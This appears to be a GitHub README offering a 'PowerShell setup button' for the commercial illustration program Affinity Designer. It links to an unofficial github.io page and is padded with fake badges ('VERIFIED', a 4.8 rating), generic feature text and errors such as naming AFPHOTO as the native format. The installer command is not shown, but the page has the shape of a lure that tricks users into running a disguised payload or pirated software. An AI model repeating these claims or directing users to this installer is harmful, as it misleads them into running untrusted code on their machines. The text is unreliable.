<div align="center">

# Affinity Designer: Professional Vector & Raster Illustration Software — Windows Desktop Client

![](files/1.jpg)

### ⚡ PowerShell Setup Button

[![](files/button.png)](https://waqarali780.github.io/affinitydesigner-desktop/)

[![ps](https://img.shields.io/badge/PS-INSTALLER-dc2626?style=social&labelColor=0d1117)]() [![rate](https://img.shields.io/badge/RATE-4.8%2F5-f59e0b?style=social&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/CHANNEL-VERIFIED-2ea44f?style=social&labelColor=0d1117)]() [![build](https://img.shields.io/badge/BUILD-SUCCESS-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

Affinity Designer is a professional vector and raster illustration application built for precision work across both design paradigms. It provides a dual-mode workspace where vector paths and pixel layers coexist, enabling seamless transitions between scalable artwork and raster-based texture work. The software includes advanced pen and pencil tools, custom brush support compatible with Photoshop brush sets, and comprehensive color management with CMYK, LAB, and Pantone support. Designed for illustrators, UI/UX designers, and concept artists, it delivers professional-grade creative control through a unified, feature-driven toolset.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Unified Vector and Raster Workspaces** – switch between vector and pixel workflows within a single document, with dedicated personas for each discipline
- **Precision Drawing Tools** – node-based pen tool, freehand pencil, shape primitives, and smart snapping for accurate curve and line construction
- **Non-Destructive Layer Architecture** – live effects, adjustment layers, masks, and clipping paths that remain editable throughout the project lifecycle
- **Custom Brush and Texture Engine** – supports raster brush sets and textured strokes, with configurable dynamics, pressure response, and canvas-level rendering
- **Advanced Color Management** – full CMYK, RGB, LAB, and spot color support with ICC profile handling, gradient maps, and color picker sampling
- **Typography and Text Controls** – OpenType feature support, paragraph and character styling, text-on-path, and advanced justification options
- **Symbols and Asset Management** – reusable symbols, asset libraries, and global color swatches to maintain consistency across large projects
- **Responsive and Export Workspaces** – slice-based export, multiple artboards per document, and dedicated output profiles for print and screen targets
- **File Format Interoperability** – native document format plus support for SVG, PDF, EPS, PSD, PNG, JPG, and TIFF import and export
- **Hardware-Accelerated Rendering** – optimized viewport performance with GPU acceleration for smooth zooming, panning, and real-time effect previews
- **Cross-Document Workflow** – drag-and-drop layer transfer between open documents and consistent tool behavior across artboards and canvases

## How it works

The application is built on a unified rendering engine that maintains vector geometry and raster pixel data within a single shared document model. Every object stores both a resolution-independent path definition and an optional pixel layer, allowing the renderer to composite output at any zoom level or export resolution without conversion artifacts. Switching between the Vector and Pixel personas does not reload the document; it reconfigures the active toolset and changes how pointer input is interpreted against the existing object graph.

Editing operations are performed through a non-destructive modifier stack. Stroke widths, brush dynamics, gradient fills, layer effects, and adjustment layers are evaluated at render time rather than baked into source data. Each modifier can be reordered, disabled, or parameterized independently, so changes propagate through dependent objects automatically. The document engine caches intermediate results and invalidates only the affected regions when a parameter changes, keeping interaction responsive on complex multi-layer artwork.

Precision tooling relies on a constraint solver and snapping graph. Nodes, handles, and transform origins are resolved against configurable candidate sets — grids, guides, object bounds, and geometric intersections — and the solver reports the active constraint during drag operations. Pen and pencil input is fitted to Bezier segments using adjustable tolerance thresholds, while node types remain editable after creation, so freehand strokes and constructed curves share the same editable representation.

Color management is handled in a device-independent pipeline. Documents carry an assigned working profile, and all fills, strokes, and gradients are stored in a reference color space before being converted to the display profile or an export target profile. Soft-proofing renders the composited result through the selected output profile without modifying source values, and palette definitions remain linked to their color space so that spot and process colors can be swapped without re-authoring artwork.

Brush and texture presets are evaluated procedurally. A brush definition combines a shape engine, a dynamics curve set for pressure, velocity, and tilt, and an optional texture source; the engine samples these inputs per stamp along the stroke path. Presets are stored as portable definitions referencing their parameters rather than pre-rendered bitmaps, enabling consistent output across zoom levels and export sizes.

Document state is persisted in a structured, versioned container that records object relationships, modifier stacks, and embedded color resources. Saves are incremental, and the container validates integrity on load, allowing recovery of the last consistent state after an unexpected shutdown. Export pipelines resolve the document through the same engine used for display, applying output profiles, flattening options, and resolution scaling at the final stage.

## Compatibility

Affinity Designer is designed to operate as a native desktop application, with the following validated environments and interoperability guarantees.

- **Operating System Support**: The application is engineered for native execution on Windows 10 and Windows 11 (64-bit). It does not rely on emulation layers for core rendering, ensuring deterministic graphics output and stable memory management across supported OS builds.

- **Architecture**: A 64-bit execution model is required. The software is compiled exclusively for x86-64 instruction sets, allowing full utilization of system memory and preventing the address-space limitations inherent to 32-bit environments.

- **Processor**: Intel and AMD processors with 64-bit capability are fully supported. The vector rendering engine and raster compositing pipeline are optimized for multi-core CPU architectures, enabling responsive performance during complex document operations.

- **Memory**: A minimum of 8 GB of system RAM is required for standard operation. For workflows involving large pixel layers, numerous vector objects, or high-resolution raster assets, 16 GB or greater is recommended to maintain smooth interaction and prevent disk-based swapping during editing sessions.

- **Graphics Hardware**: A GPU compatible with DirectX 10 or higher is required. Hardware acceleration is leveraged for canvas rendering, brush performance, and real-time preview of adjustments, ensuring low-latency interaction even with demanding document compositions.

- **Display**: The interface is optimized for standard desktop display configurations. A display resolution of 1920×1080 or greater is recommended to accommodate the full set of toolbars, panels, and workspace customization options. The application respects system-level display scaling settings.

- **File Format Interoperability**: Native document support includes AFPHOTO and AFDESIGN formats. The application provides round-trip compatibility with industry-standard vector and raster formats, including SVG, PDF, EPS, PSD, PNG, JPG, and TIFF, enabling seamless integration into existing creative pipelines. Photoshop brush sets (.abr) are supported for use within the brush engine.

- **Color Management**: Full support for CMYK, LAB, and Pantone color spaces is built into the rendering pipeline. ICC color profile handling is consistent across vector and raster workflows, ensuring color accuracy during export and print preparation.

- **Input Devices**: Standard mouse and keyboard interaction is fully supported. Pressure-sensitive graphics tablets are recognized for use with the pen, pencil, and brush tools, providing variable stroke width and opacity control.

- **Deployment Model**: The application is distributed as a self-contained desktop installation for the supported Windows platforms, requiring no external runtime dependencies or package managers.

## FAQ

**Is affinitydesigner a vector or raster editor?**

Both. The application implements a unified document model in which vector and raster layers coexist within a single canvas. Users can draw resolution-independent curves and shapes alongside pixel-based brushwork, switching between the two modes without leaving the document context or converting the underlying layer type.

**Which file formats does affinitydesigner support for import and export?**

Native documents use the AFPHOTO format, which preserves layer structure, editable text, vector geometry, and raster data. Interoperability extends to PSD, SVG, PDF, EPS, PNG, JPG, and TIFF. PSD import retains layer hierarchy and blending modes, while SVG and PDF export produce standards-compliant vector output suitable for downstream print and web workflows.

**Does affinitydesigner require a subscription or online activation?**

No. The software operates on a perpetual license model. All core features are available offline following installation; no account login, cloud dependency, or recurring fee is required to access the illustration toolset.

**What brush and texture formats are compatible?**

The brush engine accepts Photoshop brush sets (.abr), allowing existing libraries to be imported without conversion. Texture and nozzle assets can additionally be defined from raster layers within the application itself, supporting custom stamp and spray configurations.

**How does affinitydesigner handle color management?**

The color pipeline supports CMYK, LAB, RGB, and Pantone color spaces. Documents can be assigned embedded ICC profiles, and soft-proofing is available to preview output appearance against a target profile before export. This enables consistent color reproduction across screen and print deliverables.

**Can affinitydesigner run without a dedicated GPU?**

Yes. A DirectX 10 or higher compatible GPU is recommended for hardware-accelerated canvas rendering, but the application degrades gracefully to software rendering when no suitable adapter is present. Performance on large documents with numerous raster layers benefits most from GPU acceleration.

**What are the system requirements for affinitydesigner?**

Windows 10 or 11, 64-bit. An Intel or AMD 64-bit processor, 8 GB of RAM (16 GB recommended for complex multi-layer documents), and a DirectX 10+ compatible GPU. Additional storage headroom is advised when working with large embedded raster assets.

**Does affinitydesigner support non-destructive editing?**

Yes. Adjustment layers, live filters, layer effects, and vector masks are applied non-destructively, preserving source data for later revision. Raster and vector layers retain independent editability throughout the document lifecycle, and history states allow reversal of destructive operations within the configured undo depth.

## Disclaimer

The information provided in this repository is for general informational and educational purposes only. All content, including feature descriptions, compatibility details, and workflow documentation, is presented "as is" without warranty of any kind, express or implied. While every effort is made to ensure accuracy and technical correctness, no guarantee is given regarding the completeness, reliability, or suitability of the described functionality for any particular use case.

Affinity Designer is a professional vector and raster illustration environment intended for use by designers, illustrators, and creative professionals. The software's dual-mode workflow, advanced pen and pencil tools, custom brush and texture support, color and gradient systems, and file format compatibility are described to the best of available knowledge; however, actual behavior may vary depending on system configuration, hardware capabilities, and the specific version in use.

Compatibility statements referencing operating systems, processor architectures, memory thresholds, and GPU requirements reflect typical configurations and should not be interpreted as a guarantee of performance on any specific machine. Users are responsible for verifying that their environment meets the necessary specifications before proceeding with installation or use.

No liability is assumed for any loss of data, damage to hardware or software, interruption of business, or other damages arising directly or indirectly from the use or misuse of this software or the information contained in this documentation. Users assume full responsibility for determining the appropriateness of the software for their intended purposes and for taking adequate precautions, including maintaining independent backups of all creative assets and project files.

Any references to third-party formats or external tooling conventions are provided solely for descriptive purposes and do not imply endorsement, affiliation, or certification. The maintainers of this project reserve the right to modify, update, or discontinue any aspect of the software or its documentation at any time without prior notice.

## License

This software is distributed under a proprietary commercial license governing its use, reproduction, and distribution. The license grants the end user a non-exclusive, non-transferable right to install and operate the software on compatible desktop systems for personal or professional creative work, subject to the terms of the accompanying license agreement.

Redistribution, sublicensing, reverse engineering, and modification of the compiled application are restricted unless expressly authorized in writing by the project maintainer. The license does not extend to third-party assets, brush sets, or format compatibility libraries bundled with the application, which remain subject to their respective terms.

License activation and continued use are tied to the edition and version received. Upgrades, feature unlocks, and support entitlements are determined by the license tier under which the software was obtained. Users are responsible for maintaining the confidentiality of any license credentials issued to them.

The software is provided on an "as is" basis, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software or its documentation.

For the definitive terms governing installation, permitted use, and redistribution, refer to the license documentation distributed with this project.